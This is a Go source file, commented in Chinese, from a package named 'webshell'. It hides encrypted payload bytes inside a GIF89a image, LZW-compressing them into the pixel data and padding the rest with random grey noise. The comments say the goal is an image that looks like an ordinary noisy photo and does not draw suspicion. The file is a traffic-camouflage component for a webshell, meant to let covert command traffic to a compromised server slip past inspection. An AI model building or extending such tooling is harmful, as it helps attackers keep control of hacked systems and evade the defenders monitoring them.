package webshell

// disguise_gif.go — GIF LZW 容器链。
//
// 密文当作光栅数据，经 GIF 变体 LZW（8 位字面量、9→12 位递增码宽、LSB 位打包）
// 压进图像块。密文之后用随机像素补满 w×h，保证每行完整、解码器不报「图像数据不足」，
// 因此载荷区带 4 字节长度前缀来确定真实边界。
//
// LZW 编解码直接用 compress/lzw 的 LSB 变体 —— image/gif 内部用的就是它。
// 手写位流在码宽递增的边界上极易与解码器错位（实测会读到非法码，如 850），
// 这里不重复造这个轮子。
//
// 光栅索引是随机值，整张图呈噪点，熵与真实照片接近，不像纯色图那样一眼可疑。

import (
	"bytes"
	"compress/lzw"
	"crypto/rand"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
)

const (
	gifMinCodeSize = 8
	// gifMaxDecode 解压上限，防止构造的容器在服务端撑爆内存。
	gifMaxDecode = maxDisguiseRaw
)

type gifDisguise struct{}

func (gifDisguise) Name() string        { return "gif" }
func (gifDisguise) ContentType() string { return "image/gif" }

func (gifDisguise) Wrap(secret []byte) ([]byte, error) {
	if len(secret) == 0 {
		return nil, errors.New("gif: 载荷为空")
	}
	payload := packSecret(secret)

	// 画布按载荷铺开，最小 256×64，避免出现 1 像素宽的怪图
	w := 256
	h := (len(payload) + w - 1) / w
	if h < 64 {
		h = 64
	}
	raw := make([]byte, w*h)
	copy(raw, payload)
	if len(payload) < len(raw) {
		if _, err := rand.Read(raw[len(payload):]); err != nil {
			return nil, fmt.Errorf("gif: 生成填充像素失败: %w", err)
		}
	}

	var lz bytes.Buffer
	zw := lzw.NewWriter(&lz, lzw.LSB, gifMinCodeSize)
	if _, err := zw.Write(raw); err != nil {
		return nil, fmt.Errorf("gif: LZW 编码失败: %w", err)
	}
	if err := zw.Close(); err != nil {
		return nil, fmt.Errorf("gif: LZW 收尾失败: %w", err)
	}

	var buf bytes.Buffer
	buf.WriteString("GIF89a")
	writeLE16(&buf, uint16(w))
	writeLE16(&buf, uint16(h))
	buf.WriteByte(0xF7) // 全局色表 256 色 + 8bit 色深
	buf.WriteByte(0)    // 背景色索引
	buf.WriteByte(0)    // 像素宽高比
	// 全局色表：灰阶渐变，配合随机索引呈现噪点
	for i := 0; i < 256; i++ {
		buf.Write([]byte{byte(i), byte(i), byte(i)})
	}
	buf.WriteByte(0x2C) // 图像描述符
	writeLE16(&buf, 0)
	writeLE16(&buf, 0)
	writeLE16(&buf, uint16(w))
	writeLE16(&buf, uint16(h))
	buf.WriteByte(0x00) // 无局部色表、不隔行
	buf.WriteByte(gifMinCodeSize)
	buf.Write(gifSubBlocks(lz.Bytes()))
	buf.WriteByte(0x3B) // 文件结束
	return buf.Bytes(), nil
}

func (gifDisguise) Unwrap(container []byte) ([]byte, error) {
	if len(container) < 13 || !(string(container[:6]) == "GIF87a" || string(container[:6]) == "GIF89a") {
		return nil, errors.New("gif: 不是 GIF 容器")
	}
	w := int(binary.LittleEndian.Uint16(container[6:]))
	h := int(binary.LittleEndian.Uint16(container[8:]))
	if w <= 0 || h <= 0 || w*h > gifMaxDecode {
		return nil, errors.New("gif: 画布尺寸非法")
	}
	packed := container[10]
	p := 13
	if packed&0x80 != 0 { // 全局色表
		p += 3 << (uint(packed&0x07) + 1)
	}
	data, err := gifScanBlocks(container, p)
	if err != nil {
		return nil, err
	}
	zr := lzw.NewReader(bytes.NewReader(data), lzw.LSB, gifMinCodeSize)
	defer zr.Close()
	raw := make([]byte, w*h)
	if _, err := io.ReadFull(zr, raw); err != nil {
		return nil, fmt.Errorf("gif: LZW 解码失败: %w", err)
	}
	return unpackSecret(raw)
}

// gifSubBlocks 按 GIF 规范把位流切成 ≤255 字节的子块，以 0x00 结束。
func gifSubBlocks(data []byte) []byte {
	var out bytes.Buffer
	for len(data) > 0 {
		n := len(data)
		if n > 255 {
			n = 255
		}
		out.WriteByte(byte(n))
		out.Write(data[:n])
		data = data[n:]
	}
	out.WriteByte(0x00)
	return out.Bytes()
}

// gifScanBlocks 跳过图像描述符与可选的局部色表，拼接数据子块。
func gifScanBlocks(b []byte, p int) ([]byte, error) {
	if p >= len(b) || b[p] != 0x2C {
		return nil, errors.New("gif: 未找到图像描述符")
	}
	if p+10 > len(b) {
		return nil, errors.New("gif: 图像描述符不完整")
	}
	packed := b[p+9]
	q := p + 10
	if packed&0x80 != 0 { // 局部色表
		q += 3 << (uint(packed&0x07) + 1)
	}
	if q+1 > len(b) {
		return nil, errors.New("gif: 缺 LZW 最小码宽")
	}
	q++ // 跳过最小码宽字节
	var out bytes.Buffer
	for q < len(b) {
		n := int(b[q])
		q++
		if n == 0 {
			return out.Bytes(), nil
		}
		if q+n > len(b) {
			return nil, errors.New("gif: 数据子块越界")
		}
		out.Write(b[q : q+n])
		q += n
	}
	return nil, errors.New("gif: 数据子块缺少结束标记")
}

func writeLE16(w io.Writer, v uint16) {
	var b [2]byte
	binary.LittleEndian.PutUint16(b[:], v)
	_, _ = w.Write(b[:])
}
